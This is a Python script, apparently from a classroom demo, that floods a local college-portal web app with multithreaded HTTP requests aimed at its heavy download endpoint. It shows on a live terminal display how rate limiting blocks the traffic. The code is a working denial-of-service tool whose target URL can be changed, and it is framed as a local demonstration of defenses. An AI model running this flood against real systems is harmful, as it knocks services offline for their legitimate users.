"""
CollegePortal DoS Demo — attacker.py
======================================
Simulates a MALICIOUS DoS attack on top of the flash crowd.
  - Represents a bad actor who noticed the portal is busy during exam time
  - Sends automated high-speed requests to make things worse
  - Targets the heavy /download endpoint specifically

Usage:
  python attacker.py                   # 200 threads (default)
  python attacker.py --threads 350     # more aggressive
"""

import threading, requests, time, argparse, os

parser = argparse.ArgumentParser()
parser.add_argument("--threads", type=int, default=200)
parser.add_argument("--url",     default="http://127.0.0.1:5000")
args = parser.parse_args()

URL     = args.url
THREADS = args.threads
TIMEOUT = 6

lock    = threading.Lock()
sent    = 0
got200  = 0
got429  = 0
errors  = 0
stop    = threading.Event()

# ── Colors ────────────────────────────────────────────────────────────────────
def C(t, code): return f"\033[{code}m{t}\033[0m"
R = lambda t: C(t,"91"); G = lambda t: C(t,"92")
Y = lambda t: C(t,"93"); B = lambda t: C(t,"96")
BOLD = lambda t: C(t,"1"); DIM = lambda t: C(t,"2")

BANNER = r"""
   ██████╗  ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ██║  ██║██║   ██║███████╗    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██║  ██║██║   ██║╚════██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██████╔╝╚██████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         [ MALICIOUS ATTACKER — LOCAL DEMO ONLY — NEVER USE ON REAL SYSTEMS ]
"""

BAR_W = 40
def bar(v, mx, ch="█", em="░"):
    f = int(BAR_W * min(v,mx)/mx) if mx else 0
    return ch*f + em*(BAR_W-f)

def clear(): os.system("cls" if os.name=="nt" else "clear")

# ── Worker ────────────────────────────────────────────────────────────────────
def attack_worker():
    global sent, got200, got429, errors
    session = requests.Session()
    # Attackers ONLY hit the heavy endpoint to maximize damage
    targets = [
        "/download?kind=attacker",
        "/download?kind=attacker",
        "/",
        "/dashboard",
    ]
    idx = 0
    while not stop.is_set():
        target = targets[idx % len(targets)]
        idx   += 1
        try:
            r = session.get(URL + target, timeout=TIMEOUT)
            with lock:
                sent += 1
                if r.status_code == 429:
                    got429 += 1
                elif r.status_code == 200:
                    got200 += 1
                else:
                    errors += 1
        except Exception:
            with lock:
                sent   += 1
                errors += 1

# ── Display ───────────────────────────────────────────────────────────────────
def display():
    start     = time.time()
    prev_sent = 0
    prev_time = start

    while not stop.is_set():
        time.sleep(0.5)
        now = time.time()
        with lock:
            s, ok, bl, er = sent, got200, got429, errors

        dt  = now - prev_time
        rps = round((s - prev_sent) / dt) if dt else 0
        prev_sent = s
        prev_time = now
        elapsed   = int(now - start)

        clear()
        print(R(BANNER))
        print(f"  Threads  : {BOLD(str(THREADS))}  |  Target: {BOLD(URL)}  |  Time: {elapsed}s")
        print()
        print(f"  {BOLD('REQUESTS SENT')}   {B(str(s)):>9}  {DIM(bar(s, 3000))}")
        print(f"  {G('GOT SERVED')}     {G(str(ok)):>9}  {DIM(bar(ok, 3000))}")
        print(f"  {Y('BLOCKED 429')}    {Y(str(bl)):>9}  {DIM(bar(bl, 3000))}")
        print(f"  {R('ERRORS/TIMEOUT')} {R(str(er)):>9}  {DIM(bar(er, 1000))}")
        print()
        print(f"  Current RPS  : {R(BOLD(str(rps)))}")
        print()

        if bl > 0:
            pct = round(bl/s*100) if s else 0
            print(f"  {Y(f'🛡  Defense is blocking {pct}% of attack traffic')}")
        else:
            print(f"  {R('⚡ NO DEFENSE — server is being overwhelmed!')}")
            print(f"  {R('   Combined with flash crowd = FULL DoS condition')}")

        print()
        print(DIM("  Ctrl+C to stop attack"))

# ── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # Tell server we're in attack phase
    try:
        requests.get(f"{URL}/set-phase/attack", timeout=3)
    except: pass

    clear()
    print(R(BANNER))
    print(f"  Launching {BOLD(str(THREADS))} malicious threads against {BOLD(URL)}")
    print()
    print(f"  {Y('Scenario: A bad actor noticed the college portal is busy')}")
    print(f"  {Y('during exam time and is intentionally making it worse.')}")
    print(f"  {Y('Students who need to download the paper cannot get through.')}")
    print()
    input(f"  Press {BOLD('Enter')} to launch the attack (run AFTER flash_crowd.py)...")

    threads = [threading.Thread(target=attack_worker, daemon=True) for _ in range(THREADS)]
    for t in threads:
        t.start()

    try:
        display()
    except KeyboardInterrupt:
        stop.set()
        try: requests.get(f"{URL}/set-phase/normal", timeout=2)
        except: pass
        print(G("\n  Attack stopped."))
        time.sleep(0.5)
